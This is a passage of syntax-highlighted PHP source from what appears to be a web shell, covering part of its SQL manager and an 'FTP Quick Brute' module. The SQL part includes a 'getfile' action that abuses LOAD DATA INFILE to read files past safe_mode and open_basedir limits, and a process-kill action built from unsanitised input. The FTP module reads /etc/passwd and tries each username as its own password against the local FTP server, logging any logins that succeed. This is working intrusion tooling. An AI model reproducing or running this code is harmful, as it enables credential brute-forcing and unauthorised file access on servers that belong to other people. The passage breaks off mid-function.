         <span class="k">if</span> <span class="p">((</span><span class="nb">mysql_create_db</span> <span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> has been created with success!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
         <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t create DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">.&amp;lt;br&amp;gt;Reason:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">();}</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;serverstatus&quot;</span><span class="p">)</span> <span class="p">{</span>
         <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW STATUS&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Server-status variables:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Name&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Value&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
         <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
         <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;servervars&quot;</span><span class="p">)</span> <span class="p">{</span>
         <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW VARIABLES&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Server variables:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#333333 border=1&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Name&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Value&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
         <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
         <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;processes&quot;</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$kill</span><span class="p">))</span> <span class="p">{</span>
           <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;KILL &quot;</span><span class="o">.</span><span class="nv">$kill</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span>
           <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Process #&quot;</span><span class="o">.</span><span class="nv">$kill</span><span class="o">.</span><span class="s2">&quot; was killed.&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
         <span class="p">}</span>
         <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW PROCESSLIST&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Processes:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;TABLE cellSpacing=0 cellPadding=2 borderColorLight=#333333 border=1&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;ID&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;USER&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;HOST&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;DB&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;COMMAND&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;TIME&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;STATE&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;INFO&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
         <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=processes&amp;kill=&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;Kill&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
         <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;getfile&quot;</span><span class="p">)</span>
        <span class="p">{</span>
         <span class="nv">$tmpdb</span> <span class="o">=</span> <span class="nv">$sql_login</span><span class="o">.</span><span class="s2">&quot;_tmpdb&quot;</span><span class="p">;</span>
         <span class="nv">$select</span> <span class="o">=</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$select</span><span class="p">)</span> <span class="p">{</span><span class="nb">mysql_create_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span> <span class="nv">$select</span> <span class="o">=</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span> <span class="nv">$created</span> <span class="o">=</span> <span class="o">!!</span><span class="nv">$select</span><span class="p">;}</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$select</span><span class="p">)</span>
         <span class="p">{</span>
          <span class="nv">$created</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
          <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );&quot;</span><span class="p">);</span>
          <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;LOAD DATA INFILE </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> INTO TABLE tmp_file&quot;</span><span class="p">);</span>
          <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM tmp_file;&quot;</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error in reading file (permision denied)!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="k">else</span>
          <span class="p">{</span>
           <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);}</span>
           <span class="nv">$f</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
           <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span> <span class="p">{</span><span class="nv">$f</span> <span class="o">.=</span> <span class="nb">join</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$row</span><span class="p">);}</span>
           <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_getfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> does not exists or empty!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
           <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_getfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
           <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
           <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;DROP TABLE tmp_file;&quot;</span><span class="p">);</span>
          <span class="p">}</span>
         <span class="p">}</span>
         <span class="nb">mysql_drop_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span>
        <span class="p">}</span>
       <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$affected</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_affected_rows</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$affected</span><span class="p">))</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$affected</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)){</span><span class="nv">$affected</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Affected rows : &quot;</span><span class="o">.</span><span class="nv">$affected</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">//End of SQL Manager</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;ftpquickbrute&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td class=barheader colspan=2&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;.: Ftp Quick Brute :.&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;Can&#39;t run on Windows!&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="k">function</span> <span class="nf">tpftpbrutecheck</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$timeout</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">,</span><span class="nv">$sh</span><span class="p">,</span><span class="nv">$fqb_onlywithsh</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_onlywithsh</span><span class="p">)</span> <span class="p">{</span><span class="nv">$TRUE</span> <span class="o">=</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sh</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;/bin/FALSE&quot;</span><span class="p">,</span><span class="s2">&quot;/sbin/nologin&quot;</span><span class="p">)));}</span>
        <span class="k">else</span> <span class="p">{</span><span class="nv">$TRUE</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$TRUE</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$sock</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$timeout</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">ftp://&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;@&quot;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">_blank</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Connected to &quot;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;.&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nb">ob_flush</span><span class="p">();</span>
            <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$fqb_lenght</span><span class="p">))</span> <span class="p">{</span><span class="nv">$fqb_lenght</span> <span class="o">=</span> <span class="nv">$nixpwdperpage</span><span class="p">;}</span>
        <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t get /etc/passwd for password-list.&quot;</span><span class="p">;}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logging</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">)</span> <span class="p">{</span><span class="nv">$fqb_logfp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);}</span>
            <span class="k">else</span> <span class="p">{</span><span class="nv">$fqb_logfp</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}</span>
            <span class="nv">$fqb_log</span> <span class="o">=</span> <span class="s2">&quot;FTP Quick Brute (&quot;</span><span class="o">.</span><span class="nv">$sh_name</span><span class="o">.</span><span class="s2">&quot;) started at &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">)</span> <span class="p">{</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
          <span class="p">}</span>
          <span class="nb">ob_flush</span><span class="p">();</span>
          <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="nv">$ftpquick_st</span> <span class="o">=</span> <span class="nx">getmicrotime</span><span class="p">();</span>
          <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$str</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">2048</span><span class="p">));</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">tpftpbrutecheck</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$str</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="nv">$fqb_onlywithsh</span><span class="p">))</span> <span class="p">{</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Connected to &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
              <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;Connected to &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, at &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
              <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">)</span> <span class="p">{</span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
              <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
              <span class="nb">ob_flush</span><span class="p">();</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$fqb_lenght</span><span class="p">)</span> <span class="p">{</span><span class="k">break</span><span class="p">;}</span>
            <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$success</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;No success. connections!&quot;</span><span class="p">;</span> <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;No success. connections!</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;}</span>
          <span class="nv">$ftpquick_t</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nv">$ftpquick_st</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
